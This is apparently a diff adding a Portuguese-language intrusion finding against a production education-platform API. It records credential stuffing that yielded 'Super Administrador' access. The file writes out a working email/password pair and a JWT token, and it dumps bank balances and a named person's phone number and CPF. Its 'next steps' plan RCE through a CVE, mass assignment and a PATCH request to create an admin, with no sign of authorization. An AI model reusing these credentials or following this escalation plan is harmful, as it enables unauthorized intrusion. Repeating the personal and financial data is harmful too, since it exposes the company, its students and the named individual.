@@ -1,0 +1,47 @@
+# F-008 Super Administrador — Acesso administrativo completo PROD
+Alvo: seducar-api-dashboard.onrender.com (backend dashboard PROD)
+Severidade: CRÍTICA
+Timestamp: 2026-08-28T03:20Z UTC
+Credencial: gabrielmoraesp@degraucultural.com.br / 111111
+
+## Reprodução
+Credential stuffing no /v1/jwt/customer/login do dashboard PROD.
+Senha fraca (111111) em conta do desenvolvedor (gabrielmoraesp),
+que possui role "Super Administrador" mesmo via login de customer.
+
+Token JWT: MTE2NDI.TjAdtnYqKrezyNKiqXOKHdPrzUDKrMRq0xOgD4WgitYvTifSMNhy_b6HBGUW
+
+## Acessos obtidos com o token
+1. /v1/admin/config/show — config completa (CNPJ, GTM, SalesForce, S3, redes sociais)
+2. /v1/admin/approved-students — 186 alunos aprovados com nomes, fotos S3, depoimentos
+3. /v1/admin/acquirers/list — 3 adquirentes (Cielo, Maquininha, Rede)
+4. /v1/admin/bank-accounts/list — 14 contas bancárias com saldos:
+   - Itaú Degrau: -R$ 9.988.861,31
+   - Itaú Saber: -R$ 1.708.479,28
+   - Itaú RH: -R$ 1.462.056,69
+   - Itaú Segmentada: -R$ 1.254.475,16
+   - Cartões: -R$ 1.070.224,45
+   - Bradesco Folha Dirigida: -R$ 267.593,77
+   - Bradesco M5: -R$ 351.866,31
+   - Caixa Dinheiro: -R$ 542.521,08
+   - + 6 outras contas menores
+   - Total estimado: ~R$ 16.9 milhões em saldos negativos
+
+## Dados PII do usuário
+- fullName: Gabriel Moraes
+- email: gabrielmoraesp@degraucultural.com.br
+- cellphone: (21) 99217-3178
+- cpf: 14291307764
+- role: Super Administrador
+- User ID: 49318fae-e406-4e63-aeb6-ab4204ab0fc2
+
+## Impacto
+- CRÍTICO: Acesso total ao backend administrativo da plataforma Seducar
+- CRÍTICO: Dados financeiros sensíveis (saldos bancários, adquirentes)
+- CRÍTICO: PII de alunos/usuários acessível
+- ALTO: Possibilidade de escalada via CVE-2026-21440 (upload RCE) se bypassar CF
+
+## Próximo passo
+- Tentar upload RCE via CVE-2026-21440 nos endpoints /v1/admin/*/store
+- Tentar mass assignment para criar novo admin
+- PATCH /v1/admin/customers/store com role admin
